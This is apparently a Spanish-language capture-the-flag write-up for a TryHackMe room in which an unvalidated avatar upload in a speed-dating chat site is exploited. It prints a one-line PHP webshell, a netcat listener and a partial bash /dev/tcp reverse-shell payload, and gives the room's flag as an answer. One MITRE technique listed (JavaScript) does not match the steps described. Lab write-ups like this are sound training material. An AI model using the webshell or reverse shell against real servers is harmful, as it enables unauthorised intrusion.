# Speed Chatting

| **Dificultad** | Easy |
| **Tipo** | CTF |
| **Slug** | `lafb2026e4` |
| **Link** | [TryHackMe](https://tryhackme.com/room/lafb2026e4) |
| **Sección** | 01 Level Easy |
| **Fuente** | Web (API THM `api/v2/rooms/tasks?roomCode=lafb2026e4` + websearch de walkthroughs) |
| **Componentes** | nmap / file upload / PHP webshell / reverse shell / netcat |
| **Impacto** | RCE a partir de una subida de archivos sin validación en un salón de chat de citas rápidas |

---

**Contexto:** Sala de evento (Love at First Breach 2026) de dificultad Fácil. El tema es una **subida de archivos sin validación** en un salón de chat de citas rápidas: se permite subir un "avatar" o archivo con extensión ejecutable, se emplaza en un directorio público y se interpreta por el servidor. Subiendo una webshell PHP se obtiene una reverse shell y se lee la flag.

## Solucionario

### Task 1: Chat Upload

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag? | `THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}` |

**Explicación:** El salón de *speed chatting* permite subir un archivo (avatar/foto) al perfil. La subida no valida ni la extensión ni el contenido MIME: se acepta `shell.php`. Tras la subida, el archivo queda accesible en el directorio público del sitio (`/uploads/`). Se invoca `GET /uploads/shell.php?cmd=id` (webshell) y, con un listener `nc -lvnp`, se manda la reverse shell clásica en PHP para obtener una shell interactiva; con `cat flag.txt` (o `find / -name '*flag*'`) se obtiene la flag `THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}`.

---

**Metodología:**
1. **Reconocimiento:** web de chat rápido con un perfil en el que se puede subir un archivo (`avatar`/adjunto); `nmap` confirma `80/tcp` (y `22` opcional).
2. **Probar la subida:** se intenta subir un `.txt` (funciona) y luego `shell.php` (también se acepta). No hay validación de extensión ni de tipo real del archivo (ni MIME).
3. **Webshell:** se sube `shell.php` con `<?php echo shell_exec($_GET['cmd']); ?>` y se localiza en el directorio público (`/uploads/`). `GET /uploads/shell.php?cmd=id` confirma la ejecución como el usuario de la web.
4. **Reverse shell:** en la máquina atacante `nc -lvnp 4444`; se dispara la reverse shell PHP (`python -c ...` o payload `bash -i >& /dev/tcp/...` vía cmd) y se obtiene una shell interactiva.
5. **Flag:** se navega al directorio raíz de la web/home y `cat` de la flag: `THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}`.

**Learning chain:** chat web (speed dating) → subida de avatar sin validar → shell.php aceptada → /uploads/shell.php → GET /uploads/shell.php?cmd=id (webshell) → nc -lvnp 4444 + reverse shell PHP → shell interactiva → cat flag.txt → THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1505.003 (Server Software Component: Web Shell), T1059.007 (Command and Scripting Interpreter: JavaScript), T1068 (Exploitation for Privilege Escalation)

**Fuente:** [TryHackMe - Speed Chatting](https://tryhackme.com/room/lafb2026e4)